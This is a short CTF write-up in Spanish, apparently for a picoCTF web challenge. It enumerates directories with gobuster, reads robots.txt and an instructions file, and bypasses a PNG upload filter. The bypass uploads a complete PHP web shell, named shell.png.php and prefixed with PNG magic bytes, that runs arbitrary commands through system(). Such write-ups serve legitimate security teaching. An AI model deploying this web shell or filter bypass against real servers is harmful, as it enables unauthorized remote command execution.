# Retos CTF web

## Bypass file upload PNG

1º Vamos a reconocer si hay algun directorio donde se suban los ficheros utilizamos gobuster

```ruby
gobuster dir -u http://atlas.picoctf.net:<port>/ -w /usr/share/dirb/wordlists/big.txt
```

Nos encuentra lo siguiente:
```ruby
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 285]
/.htaccess            (Status: 403) [Size: 285]
/robots.txt           (Status: 200) [Size: 62]
/server-status        (Status: 403) [Size: 285]
/uploads              (Status: 301) [Size: 333] [--> http://atlas.picoctf.net:63586/uploads/]                                                             
Progress: 20469 / 20470 (100.00%)
```

Sabemos que tenemos un directorio donde se almacena los ficheros que subimos y vemos que hay un /robots.txt

```ruby
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

si vemos el fichero de intructions.txt nos encontramos lo siguiente

```ruby
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

Tiene que aparecer un PNG al principio y además tiene que estar en formato `.png`

Creo el siguiente fichero `shell.png.php`

```HTML
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

Nos da un acceso a una shell interctiva.





